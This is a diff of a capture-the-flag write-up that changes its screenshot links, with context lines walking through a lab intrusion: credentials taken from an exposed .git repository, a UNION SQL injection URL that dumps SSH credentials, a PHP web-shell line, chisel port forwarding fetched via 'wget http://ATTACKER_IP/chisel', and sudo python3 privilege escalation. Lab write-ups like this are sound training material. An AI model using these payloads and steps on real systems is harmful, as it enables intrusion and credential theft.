@@ -1,7 +1,7 @@
 ______________
 - In this _**CTF**_ we find an exposed _**GitHub**_ repository:
 
-![[Captura de pantalla 2026-02-19 195701.png]]
+<img width="2520" height="857" alt="Captura de pantalla 2026-02-19 195701" src="https://github.com/user-attachments/assets/d18fb0e5-0877-4b41-a44a-f3c1893c81dd" />
 
 ```
 http://192.168.1.35/.git/
@@ -27,11 +27,11 @@ git log
 
 - The idea here is to go commit by commit and look for anything sensitive (credentials, tokens, emails, etc.)
 
-![[Captura de pantalla 2026-02-20 172534.png]]
+<img width="2135" height="855" alt="Captura de pantalla 2026-02-20 172534" src="https://github.com/user-attachments/assets/90b88916-9bd5-4e55-a568-a82f755bd7f9" />
 
 - In this case, we find a **password and an email**, so we try those credentials.
 
-![[Captura de pantalla 2026-02-20 172452.png]]  
+<img width="3172" height="1442" alt="Captura de pantalla 2026-02-20 172452" src="https://github.com/user-attachments/assets/151ee13b-1ad7-4111-ad76-418e6dc9c46e" />
 The credentials worked, and we gain access to this section.
 
 - While exploring the application, we notice it's vulnerable to _**SQL Injection**_:
@@ -52,8 +52,9 @@ http://192.168.1.15/dashboard.php?id=-1%27%20union%20select%201,group_concat(use
 
  With this injection, we retrieve SSH credentials.
 
-![[Captura de pantalla 2026-02-20 182146.png]]  
-![[Captura de pantalla 2026-02-20 181950.png]]  
+<img width="2352" height="687" alt="Captura de pantalla 2026-02-20 182146" src="https://github.com/user-attachments/assets/91850bed-a40d-4a01-aa83-ccd77927e900" />
+
+<img width="1940" height="1220" alt="Captura de pantalla 2026-02-20 181950" src="https://github.com/user-attachments/assets/d643f28b-f386-4996-bbe0-9b0805c039ac" />
 And we successfully log in!
 
 - After some time searching for sensitive files or even **SUID binaries** without success, we move to a deeper analysis of the internal network. Since we already have access to the victim machine, we use:
@@ -64,7 +65,7 @@ netstat -nat
 
  This shows **active TCP connections** on the system.
 
-![[Captura de pantalla 2026-02-20 201103.png]]  
+<img width="3350" height="1199" alt="Captura de pantalla 2026-02-20 201103" src="https://github.com/user-attachments/assets/5ddf24cd-b319-4dd4-ae65-884bea5c96e4" />
 We notice a suspicious port: **9999**. Now we analyze the processes using:
 
 ```
@@ -87,7 +88,7 @@ echo system($_GET['cmd']);
 }
 ```
 
-![[Captura de pantalla 2026-02-20 202607.png]]  
+<img width="1530" height="154" alt="Captura de pantalla 2026-02-20 202607" src="https://github.com/user-attachments/assets/5587693c-484f-4b95-81e5-07c8028091c2" />
 Testing it confirms it works correctly.
 
 - With this in mind, we move to **port forwarding** to access that internal service.
@@ -106,8 +107,8 @@ localhost:9999
 
 - From our machine will forward the traffic to **port 9999 on the victim**.
 
-![[Captura de pantalla 2026-02-20 222044.png]]  
-     As we can see, it works exactly as expected, allowing us to interact with the internal web shell.
+<img width="2245" height="592" alt="Captura de pantalla 2026-02-20 222044" src="https://github.com/user-attachments/assets/a67d7f3d-d658-4882-b289-ac0f1032febb" />
+As we can see, it works exactly as expected, allowing us to interact with the internal web shell.
 
 - At this point, we just need to get a proper **reverse shell**, stabilize it, and proceed with privilege escalation.
 
@@ -119,11 +120,12 @@ localhost:9999
 sudo -l
 ```
 
-![[Captura de pantalla 2026-02-20 223813.png]]  
-![[Captura de pantalla 2026-02-20 224453.png]]  
+<img width="1335" height="332" alt="Captura de pantalla 2026-02-20 223813" src="https://github.com/user-attachments/assets/79b66f00-e7d2-4fe7-ac3d-a55eb2dbd568" />
+
+<img width="2520" height="382" alt="Captura de pantalla 2026-02-20 224453" src="https://github.com/user-attachments/assets/2f37d0cf-cbe9-456c-a98d-f087f2d7c86f" />
 We see that the user can execute **python3**, which is a clear privilege escalation vector.
 
-![[Captura de pantalla 2026-02-20 225539.png]]
+<img width="1907" height="752" alt="Captura de pantalla 2026-02-20 225539" src="https://github.com/user-attachments/assets/7cfcf549-a1bd-42f0-adff-b048f0a1b0fb" />
 
 - The command
 
@@ -133,7 +135,7 @@ sudo -u
 
  Allows executing commands as another user (in this case, **root**).
 
-![[Captura de pantalla 2026-02-20 225612.png]]  
+<img width="915" height="280" alt="Captura de pantalla 2026-02-20 225612" src="https://github.com/user-attachments/assets/5e0e8bf3-4387-4328-97cf-d892977e37be" />
 And there we get the **flag**!
 
 ---
@@ -144,7 +146,7 @@ And there we get the **flag**!
 
 [https://github.com/jpillora/chisel/releases/tag/v1.11.3](https://github.com/jpillora/chisel/releases/tag/v1.11.3)
 
-![[Pasted image 20260221131335.png]]
+<img width="2315" height="789" alt="Pasted image 20260221131335" src="https://github.com/user-attachments/assets/c8236021-a571-47e2-8f9f-ff99876e25bc" />
 
 - Then we move it to our working directory, decompress it with **gunzip**, and assign execution permissions:
 
@@ -164,11 +166,11 @@ python3 -m http.server 80
 wget http://ATTACKER_IP/chisel
 ```
 
-![[Captura de pantalla 2026-02-21 133634.png]]
+<img width="3220" height="1190" alt="Captura de pantalla 2026-02-21 133634" src="https://github.com/user-attachments/assets/0b0e1060-cc1b-4ffa-878b-8eee58c54530" />
 
 - After downloading, we give execution permissions on the victim and run it:
 
-![[Captura de pantalla 2026-02-21 134834.png]]
+<img width="2410" height="1022" alt="Captura de pantalla 2026-02-21 134834" src="https://github.com/user-attachments/assets/3080b2d6-66db-4ea3-86b7-680b34966217" />
 
 ```
 ./chisel client 192.168.1.203:1234 R:9999:127.0.0.1:9999
@@ -179,7 +181,8 @@ wget http://ATTACKER_IP/chisel
     R:9999 → victim port  
     :9999 → attacker port
 
-![[Captura de pantalla 2026-02-21 150724.png]]  
+<img width="1940" height="655" alt="Captura de pantalla 2026-02-21 150724" src="https://github.com/user-attachments/assets/18674ae3-f6a3-421c-ab8e-077dc5e6b168" />
+
 We now have a successful connection. From here, we repeat the same idea: get a reverse shell and escalate privileges.
 ### Key points
 
